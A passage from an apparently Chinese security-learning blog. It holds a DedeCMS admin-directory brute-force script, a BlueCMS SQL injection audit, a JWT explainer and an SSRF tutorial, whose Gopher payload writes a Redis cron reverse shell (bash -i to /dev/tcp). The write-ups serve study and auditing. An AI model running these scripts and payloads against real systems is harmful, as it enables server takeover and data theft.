<pre><code>$cfg_not_allowall = &quot;php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml&quot;;</code></pre><p>既然上传的name不让以这些结尾，那么我们查.gif不过分吧</p>
<p>找一处验证以下这个核心文件产生的小漏洞：<br><img src="https://s1.ax1x.com/2018/08/21/PIOPhV.png" alt><br><img src="https://s1.ax1x.com/2018/08/21/PIOk1U.png" alt></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code>_FILES[hpdoger][tmp_name]=./ded&lt;&lt;/images/adminico.gif&amp;_FILES[hpdoger][name]=0&amp;_FILES[hpdoger][size]=0&amp;_FILES[hpdoger][type]=image/gif</code></pre><p>这个poc根据mochazz师傅的poc练手写的，膜mochazz师傅~：</p>
<pre><code># -*- coding: utf-8 -*-
from itertools import permutations
import requests

def guess_back_dir(url,data,characters):
    for num in range(1,5):
        for every in permutations(characters,num):
            payload = &#39;&#39;.join(every)
            data[&quot;_FILES[hpdoger][tmp_name]&quot;] = data[&quot;_FILES[hpdoger][tmp_name]&quot;].format(p = payload)
            print(&quot;testing:&quot;,payload)
            r = requests.post(url,data = data)
            if find_page(r) &gt; 0:
                print(&quot;back_dir:[+]&quot;,payload)
                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;
                return payload
            data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;

def guess_rest_dir(back_dir,url,data,characters):
    while True:
        for singel in characters:
            if singel != characters[-1]:
                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = data[&quot;_FILES[hpdoger][tmp_name]&quot;].format(p=back_dir + singel)
                r = requests.post(url,data = data)
                # print data
                if find_page(r) &gt; 0:
                    print(&quot;guess successfully[+]:&quot;,back_dir)
                    back_dir += singel
                    data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;
                    break
                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;
            else:
                return  back_dir

def find_page(response):
    if &quot;Upload filetype not allow !&quot; not in response.text and response.status_code == 200:
        return 1

def main():
    characters = &quot;abcdefghijklmnopqrstuvwxyz0123456789_!#&quot;
    url = raw_input(&quot;Please input your target:&quot;)
    data = {
        &quot;_FILES[hpdoger][tmp_name]&quot;: &quot;./{p}&lt;&lt;/images/adminico.gif&quot;,
        &quot;_FILES[hpdoger][name]&quot;: 0,
        &quot;_FILES[hpdoger][size]&quot;: 0,
        &quot;_FILES[hpdoger][type]&quot;: &quot;image/gif&quot;
    }

    back_dir = guess_back_dir(url,data,characters)
    name = guess_rest_dir(back_dir,url,data,characters)
    print(&quot;The background address is[+]:&quot;,name)


if __name__ == &#39;__main__&#39;:
    main()</code></pre><h3 id="最后穿插一个关于FILE变量的小知识点"><a href="#最后穿插一个关于FILE变量的小知识点" class="headerlink" title="最后穿插一个关于FILE变量的小知识点"></a>最后穿插一个关于FILE变量的小知识点</h3><p>$_FILES[“file”][“name”] - 被上传文件的名称<br>$_FILES[“file”][“type”] - 被上传文件的类型<br>$_FILES[“file”][“size”] - 被上传文件的大小，以字节计<br>$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称<br>$_FILES[“file”][“error”] - 由文件上传导致的错误代码</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>代码审计之DedeCMS V5.7 SP2后台存在代码执行漏洞(<a href="https://mochazz.github.io/2018/03/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BDedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/" target="_blank" rel="noopener">https://mochazz.github.io/2018/03/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BDedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/</a>)</p>
<p>奇技淫巧 | DEDECMS找后台目录(<a href="https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/</a>)</p>
<p>膜前辈师傅们~</p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/21/Dedecms V5.7 SP2代码审计/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/18/代码审计复现：Bluecms 1.6/"> 
                    代码审计复现：Bluecms 1.6 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-18   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近一阵子得了一场病，加之情感上的一件事，痛不欲生。陆陆续续的缓过来了，渡劫余生，留下该留下的。病也慢慢在恢复了。</p>
<p>前些日子说要学代码审计，买了本《代码审计》看了两天，为作者尹毅先生无限打call，人生导师一样的人物，经历是传奇的，努力是可见的。书中开篇点题为什么要代码审计？这是web狗的一项技能。其实，当初学安全的时候我一直想要走的方向是渗透，虽然至今也是。但是渗透就仅仅是用工具来attack么？不，渗透是一种思路，是一种积累，也是一种艺术。它是我们基础的升华，经验的绽放。脚本小子use tools will nerver be a hacker。我们要学的、做的要很多，知识面要很宽，尽管路会很难。</p>
<p>从今天起，至未来的一个月，会把学习的全部精力都投入到审计方向，立下flag:未来半个月内拿自己的cve</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>cms: bulecms 1.6 sp1<br>php: 5.4 + mysql 5.5.53</p>
<h2 id="sql注入一"><a href="#sql注入一" class="headerlink" title="sql注入一"></a>sql注入一</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>问题文件位于：/uploads/ad_js.php</p>
<pre><code>$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#39;ad&#39;).&quot; WHERE ad_id =&quot;.$ad_id);</code></pre><p>变量未用单引号闭合，可能会引起注入</p>
<p>跟踪一下$ad_id，查找该参数如何获得</p>
<pre><code>$ad_id = !empty($_GET[&#39;ad_id&#39;]) ? trim($_GET[&#39;ad_id&#39;]) : &#39;&#39;;</code></pre><p>trim去掉ad_id两侧空格，未过滤参数，可注入</p>
<p>再追踪一下getone()函数怎么定义的，一个定义mysql相关操作的文件位于/uploads/include/mysql.class.php：</p>
<pre><code>    function getone($sql, $type=MYSQL_ASSOC){
        $query = $this-&gt;query($sql,$this-&gt;linkid);
        $row = mysql_fetch_array($query, $type);
        return $row;
    }</code></pre><p>追踪此类里query函数的定义：</p>
<pre><code>    function query($sql){
        if(!$query=@mysql_query($sql, $this-&gt;linkid)){
            $this-&gt;dbshow(&quot;Query error:$sql&quot;);
        }else{
            return $query;
        }
    }</code></pre><p>查询出错则dbshow进行报错，有结果则返回$query集合后，$row进行取值</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="https://s1.ax1x.com/2018/08/16/PWEujK.jpg" alt></p>
<h2 id="sql注入二"><a href="#sql注入二" class="headerlink" title="sql注入二"></a>sql注入二</h2><p>一开始审了一个前台/uploads/user.php的宽字节注入,记一下思路：</p>
<p>在mysql.class.php中看到：</p>
<pre><code>mysql_query( &quot;SET NAMES gbk&quot;);</code></pre><p>看一下有没有进行addslashes过滤<br><img src="https://s1.ax1x.com/2018/08/16/PWEMnO.png" alt></p>
<p>果然对POST\GET过滤，追踪deep_addslashes</p>
<pre><code>function deep_addslashes($str)
{
    if(is_array($str))
    {
        foreach($str as $key=&gt;$val)
        {
            $str[$key] = deep_addslashes($val);
        }
    }
    else
    {
        $str = addslashes($str);
    }
    return $str;
}</code></pre><p>联想宽字节，先追踪一下处理表单的方法</p>
<pre><code> elseif($act == &#39;index_login&#39;){
     $user_name = !empty($_REQUEST[&#39;user_name&#39;]) ? trim($_REQUEST[&#39;user_name&#39;]) : &#39;&#39;;
     $pwd = !empty($_REQUEST[&#39;pwd&#39;]) ? trim($_REQUEST[&#39;pwd&#39;]) : &#39;&#39;;
     $remember = isset($_REQUEST[&#39;remember&#39;]) ? intval($_REQUEST[&#39;remember&#39;]) : 0;
     if($user_name == &#39;&#39;){
         showmsg(&#39;�û�������Ϊ��&#39;);
     }
     if($pwd == &#39;&#39;){
         showmsg(&#39;���벻��Ϊ��&#39;);
     }
    $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;admin&#39;).&quot; WHERE admin_name=&#39;$user_name&#39;&quot;);
    if($row[&#39;num&#39;] == 1){
        showmsg(&#39;ϵͳ�û��鲻�ܴ�ǰ̨��¼&#39;);
    }
    $w = login($user_name, $pwd);

    if(defined(&#39;UC_API&#39;) &amp;&amp; @include_once(BLUE_ROOT.&#39;uc_client/client.php&#39;)){
        list($uid, $username, $password, $email) = uc_user_login($user_name, $pwd);
        if($uid&gt;0){
            $password = md5($password);
            if(!$w){
                $db-&gt;query(&quot;INSERT INTO &quot;.table(&#39;user&#39;).&quot; (user_name, pwd, email, reg_time) VALUES (&#39;$username&#39;, &#39;$password&#39;, &#39;$email&#39;, &#39;$timestamp&#39;)&quot;); 
                $w = 1;
            }
            $ucsynlogin = uc_user_synlogin($uid);
        }
        elseif($uid === -1){
            if($w == 1){
                $user_info = $db-&gt;getone(&quot;SELECT email FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39;&quot;);
                $uid = uc_user_register($user_name, $pwd, $user_info[&#39;email&#39;]);
                if($uid &gt; 0) $ucsynlogin = uc_user_synlogin($uid);
            }else $w = -1;
        }
        elseif($uid == -2){
            showmsg(&#39;�������&#39;);
        }
        echo $ucsynlogin;
    }
    if($w == -1 || $w == 0){
        showmsg(&#39;��������û��������벻��ȷ&#39;);
    }
    elseif($w == 1){
        update_user_info($user_name);
         if($remember==1){
             setcookie(&#39;BLUE[user_id]&#39;, $_SESSION[&#39;user_id&#39;], time()+172800, $cookiepath, $cookiedomain);
             setcookie(&#39;BLUE[user_name]&#39;, $user_name, time()+172800, $cookiepath, $cookiedomain);
            setcookie(&#39;BLUE[user_pwd]&#39;, md5(md5($pwd).$_CFG[&#39;cookie_hash&#39;]), time()+172800, $cookiepath, $cookiedomain);
         }
         showmsg(&#39;��ӭ�� &#39;.$user_name.&#39; ���������ڽ�ת����Ա����&#39;, &#39;user.php&#39;);
     }
 }</code></pre><p>追踪user_name怎么传入：</p>
<pre><code>$user_name = !empty($_REQUEST[&#39;user_name&#39;]) ? trim($_REQUEST[&#39;user_name&#39;]) : &#39;&#39;;</code></pre><p>发现无过滤</p>
<p>再追踪一下对suername的sql语句如何执行：</p>
<pre><code>$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;admin&#39;).&quot; WHERE admin_name=&#39;$user_name&#39;&quot;);</code></pre><p>看到调用了getone()函数，第一个注入有介绍。</p>
<p>再看到下面一句：</p>
<pre><code>    if($row[&#39;num&#39;] == 1){
        showmsg(&#39;ϵͳ�û��鲻�ܴ�ǰ̨��¼&#39;);
    }</code></pre><p>在admin的表中查询admin_name表中是否有传入的user_name，若存在，$row[‘num’]值为1，然后执行showmsg函数，输出：“前台无法登陆”后返回主页。值为0进行以下操作：</p>
<pre><code>$w = login($user_name, $pwd);</code></pre><p>再追踪login函数得到：</p>
<pre><code> function login($user_name,$pwd){
     global $db;
    $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39;&quot;);
    if($row[&#39;num&#39;]==0){
        $result = 0;
    }else{
        $sql = &quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39; and pwd=md5(&#39;$pwd&#39;)&quot;;
         $user_num = $db-&gt;getone($sql);
         if($user_num[&#39;num&#39;]){
             $result = 1;
         }else $result = -1;
    }
     return $result;
 }</code></pre><p>到这里我们可以理解，这个页面的登陆逻辑是这样的：</p>
<p><strong>如果我们的用户名是admin表中用户名，则不允许登陆</strong><br><strong>若不是表中的用户名，则会进行user表的对比查询，再判断是否有这个用户</strong></p>
<p>明确思路：盲注<br>注入是否成功的判断条件：$row[‘num’]返回值</p>
<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>success injection: <img src="https://s1.ax1x.com/2018/08/17/PWKfzj.jpg" alt></p>
<p>default injection: <img src="https://s1.ax1x.com/2018/08/17/PWKILq.png" alt></p>
<p>google一下发现别人挖过后台登陆验证的宽字节，能够利用…<br><img src="https://blog.0kami.cn/img/bluecms_code_review/bluecms_login_success.png" alt></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>p师傅的浅析白盒审计中的字符编码及SQL注入：<a href="http://www.freebuf.com/articles/web/31537.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/31537.html</a></p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/18/代码审计复现：Bluecms 1.6/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/12/（转载） 基于 Token 的身份验证/"> 
                    (转载)基于 Token 的身份验证 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-12   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础知识/">基础知识</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="传统身份验证的方法"><a href="#传统身份验证的方法" class="headerlink" title="传统身份验证的方法"></a>传统身份验证的方法</h2><p>HTTP 是一种没有状态的协议，也就是它并不知道是谁是访问应用。这里我们把用户看成是客户端，客户端使用用户名还有密码通过了身份验证，不过下回这个客户端再发送请求时候，还得再验证一下。</p>
<p>解决的方法就是，当用户请求登录的时候，如果没有问题，我们在服务端生成一条记录，这个记录里可以说明一下登录的用户是谁，然后把这条记录的 ID 号发送给客户端，客户端收到以后把这个 ID 号存储在 Cookie 里，下次这个用户再向服务端发送请求的时候，可以带着这个 Cookie ，这样服务端会验证一个这个 Cookie 里的信息，看看能不能在服务端这里找到对应的记录，如果可以，说明用户已经通过了身份验证，就把用户请求的数据返回给客户端。</p>
<p>上面说的就是 Session，我们需要在服务端存储为登录的用户生成的 Session ，这些 Session 可能会存储在内存，磁盘，或者数据库里。我们可能需要在服务端定期的去清理过期的 Session 。</p>
<h2 id="基于-Token-的身份验证方法"><a href="#基于-Token-的身份验证方法" class="headerlink" title="基于 Token 的身份验证方法"></a>基于 Token 的身份验证方法</h2><p>使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的：</p>
<ul>
<li><p>客户端使用用户名跟密码请求登录</p>
</li>
<li><p>服务端收到请求，去验证用户名与密码</p>
</li>
<li><p>验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端</p>
</li>
<li><p>客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里</p>
</li>
<li><p>客户端每次向服务端请求资源的时候需要带着服务端签发的 Token</p>
</li>
<li><p>服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据</p>
</li>
</ul>
<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>实施 Token 验证的方法挺多的，还有一些标准方法，比如 JWT，读作：jot ，表示：JSON Web Tokens 。JWT 标准的 Token 有三个部分：</p>
<ul>
<li><p>header</p>
</li>
<li><p>payload</p>
</li>
<li><p>signature</p>
</li>
</ul>
<p>中间用点分隔开，并且都会使用 Base64 编码，所以真正的 Token 看起来像这样：</p>
<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>header 部分主要是两部分内容，一个是 Token 的类型，另一个是使用的算法，比如下面类型就是 JWT，使用的算法是 HS256。</p>
<p>{</p>
<p>  “typ”: “JWT”,</p>
<p>  “alg”: “HS256”</p>
<p>}</p>
<p>上面的内容要用 Base64 的形式编码一下，所以就变成这样：</p>
<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</p>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>Payload 里面是 Token 的具体内容，这些内容里面有一些是标准字段，你也可以添加其它需要的内容。下面是标准字段：</p>
<ul>
<li><p>iss：Issuer，发行者</p>
</li>
<li><p>sub：Subject，主题</p>
</li>
<li><p>aud：Audience，观众</p>
</li>
<li><p>exp：Expiration time，过期时间</p>
</li>
<li><p>nbf：Not before</p>
</li>
<li><p>iat：Issued at，发行时间</p>
</li>
<li><p>jti：JWT ID</p>
</li>
</ul>
<p>比如下面这个 Payload ，用到了 iss 发行人，还有 exp 过期时间。另外还有两个自定义的字段，一个是 name ，还有一个是 admin 。</p>
<p>{</p>
<p> “iss”: “ninghao.net”,</p>
<p> “exp”: “1438955445”,</p>
<p> “name”: “wanghao”,</p>
<p> “admin”: true</p>
<p>}</p>
<p>使用 Base64 编码以后就变成了这个样子：</p>
<p>eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ</p>
<h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>JWT 的最后一部分是 Signature ，这部分内容有三个部分，先是用 Base64 编码的 header.payload ，再用加密算法加密一下，加密的时候要放进去一个 Secret ，这个相当于是一个密码，这个密码秘密地存储在服务端。</p>
<ul>
<li><p>header</p>
</li>
<li><p>payload</p>
</li>
<li><p>secret</p>
</li>
</ul>
<p>var encodedString = base64UrlEncode(header) + “.” + base64UrlEncode(payload);</p>
<p>HMACSHA256(encodedString, ‘secret’);</p>
<p>处理完成以后看起来像这样：</p>
<p>SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
<p>最后这个在服务端生成并且要发送给客户端的 Token 看起来像这样：</p>
<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
<p>客户端收到这个 Token 以后把它存储下来，下回向服务端发送请求的时候就带着这个 Token 。服务端收到这个 Token ，然后进行验证，通过以后就会返回给客户端想要的资源。</p>
<h2 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h2><p>本文转载自<a href="https://ninghao.net/blog/2834" target="_blank" rel="noopener">https://ninghao.net/blog/2834</a></p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/12/（转载） 基于 Token 的身份验证/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/10/初探ssrf/"> 
                    初探ssrf 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-10   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/">webshell</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>ssrf是很常见的一个漏洞，一开始把ssrf简单的理解为链接重定向漏洞，其实也可以这么说，曾经这个漏洞影响过许多互联网企业。</p>
<p>危害有如下几个类型:</p>
<p>内网端口扫描<br>内网Web应用指纹识别<br>通过访问内网Web应用robots.txt等方式辨别cms的类型及版本然后根据公开的漏洞去攻击内网服务器<br>读取本地文件<br>读取远程文件<br>攻击内网其他应用,如redis,从而反弹shell</p>
<h2 id="SSRF原理"><a href="#SSRF原理" class="headerlink" title="SSRF原理"></a>SSRF原理</h2><h3 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h3><p>curl是一个利用URL语法在命令行方式下工作的文件传输工具。PHP中有cURL的苦，叫libcurl，支持许多协议：FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 以及 LDAP。curl同样支持HTTPS认证，HTTP POST方法, HTTP PUT方法, FTP上传, kerberos认证, HTTP上传, 代理服务器, cookies, 用户名/密码认证, 下载文件、</p>
<p>我们可以利用curl进行抓取网页内容</p>
<h3 id="伪造请求"><a href="#伪造请求" class="headerlink" title="伪造请求"></a>伪造请求</h3><p>通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。</p>
<p>类似于这样的形式：</p>
<pre><code>ip:port/ssrf.php?url=xxxx</code></pre><p>我们构造一个url请求，server端接收并访问传入的url，然后会返回给客户端相应数据（如图片等）。正常情况下，服务端希望我们传入的url是一个正常的链接，可能是站内的图片、网链，也可能是站外的其它友链。php后端使用<strong>cURL</strong>初始化一个新的cURL会话并获取一个网页。</p>
<p>但是，如果我们通过curl允许的协议来传递给url这个参数一些邪恶的信息呢？后果可想而知</p>
<h2 id="SSRF分析"><a href="#SSRF分析" class="headerlink" title="SSRF分析"></a>SSRF分析</h2><h3 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h3><p>ssrf漏洞代码，未作过滤</p>
<pre><code>&lt;?php 
// 创建一个新cURL资源
$ch = curl_init(); 

// 设置URL和相应的选项
curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); 
curl_setopt($ch, CURLOPT_HEADER, 0); 

// 抓取URL并把它传递给浏览器
curl_exec($ch); 

// 关闭cURL资源，并且释放系统资源
curl_close($ch); 
?&gt;</code></pre><h3 id="file协议查看文件"><a href="#file协议查看文件" class="headerlink" title="file协议查看文件"></a>file协议查看文件</h3><p><img src="https://s1.ax1x.com/2018/08/10/P6BOht.png" alt></p>
<p>我们url传入的file协议语句，会在服务会执行一个curl语句，返回查询的信息。这个是基于有回显的情况，不过现在很多php后端如果这样写的话：</p>
<pre><code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)</code></pre><p>协议就算失效了，这种方法失败</p>
<h3 id="dict协议探测端口"><a href="#dict协议探测端口" class="headerlink" title="dict协议探测端口"></a>dict协议探测端口</h3><p>探测22端口(ssh服务)</p>
<pre><code>http://ip:port/ssrf.php?url=dict://127.0.0.1:22/info</code></pre><p>服务端会执行：</p>
<pre><code>curl -v &#39;dict://127.0.0.1:22/info&#39;</code></pre><p><img src="https://s1.ax1x.com/2018/08/11/P6Rt78.png" alt></p>
<p>探测3306端口</p>
<pre><code>http://ip:port/ssrf.php?url=dict://127.0.0.1:3306
/info</code></pre><h3 id="Gopher协议攻击redis反弹shell"><a href="#Gopher协议攻击redis反弹shell" class="headerlink" title="Gopher协议攻击redis反弹shell"></a>Gopher协议攻击redis反弹shell</h3><p>Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。<br>首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：</p>
<pre><code>redis-cli -h $1 flushall
echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/要反弹的公网ip/反弹端口 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save</code></pre><p>这里网址以127.0.0.1，redis端口6379，公网ip为172.19.23.228且监听端口为2333为例<br>改成适配于 Gopher 协议的 URL：</p>
<pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></pre><h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>Curl默认不支持302跳转，所以需要在ssrf.php中加上一行<code>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)</code>来支持跳转</p>
<p>代码如下：</p>
<pre><code>function curl($url){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);
// 限制为HTTPS、HTTP协议
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($ch);
curl_close($ch);
}

$url = $_GET[&#39;url&#39;];
curl($url);
?&gt;</code></pre><p>php限制为http、https协议之后，我们就无法使用刚才的file dict gopher的协议了，但是我们如果开启302跳转的话可以，跳转到我们自己的vps上的网页来执行这些协议。因为服务端并没有ban掉这些协议，所以我们就找一个跳板来执行</p>
<p>302辅助跳转脚本：</p>
<pre><code>&lt;?php  
$schema = $_GET[&#39;schema&#39;];
$ip     = $_GET[&#39;ip&#39;];
$port   = $_GET[&#39;port&#39;];
$query  = $_GET[&#39;query&#39;];

echo &quot;\n&quot;;
echo $schema . &quot;://&quot;.$ip.&quot;/&quot;.$query;

if(empty($port)){  
    header(&quot;Location: $schema://$ip/$query&quot;);
} else {
    header(&quot;Location: $schema://$ip:$port/$query&quot;);
}</code></pre><p>通过http/s协议引入我们自己的php脚本，这样就可以执行其他协议语句<br>发送的请求如下：</p>
<pre><code>http://127.0.0.1/ssrf.php?url=http://your vps&#39;s ip/302.php?schema=dict%26ip=127.0.0.1%26port=22%26query=info</code></pre><p>注意是POST请求还是GET请求</p>
<h2 id="SSRF挖掘"><a href="#SSRF挖掘" class="headerlink" title="SSRF挖掘"></a>SSRF挖掘</h2><p>社交分享功能<br>转码服务<br>在线翻译<br>在线代理浏览器<br>图片加载/下载<br>图片/文章收藏功能<br>API或调用外部URL的功能</p>
<h2 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h2><h3 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h3><p>数字地址(十进制)：127.0.0.1-&gt;2130706433<br>十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1-&gt;127.1</p>
<h3 id="xip-io绕过"><a href="#xip-io绕过" class="headerlink" title="xip.io绕过"></a>xip.io绕过</h3><p>127.0.0.1.xip.io<br><a href="http://www.127.0.0.1.xip.io" target="_blank" rel="noopener">www.127.0.0.1.xip.io</a><br>xxx.127.0.0.1.xip.io<br>fuzz.xxx.127.0.0.1.xip.io</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="noopener">利用 gopher 协议拓展攻击面</a></p>
<p><a href="https://www.anquanke.com/post/id/145519" target="_blank" rel="noopener">浅析SSRF原理及利用方式</a></p>
<p><a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">SSRF漏洞分析与利用</a></p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/10/初探ssrf/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
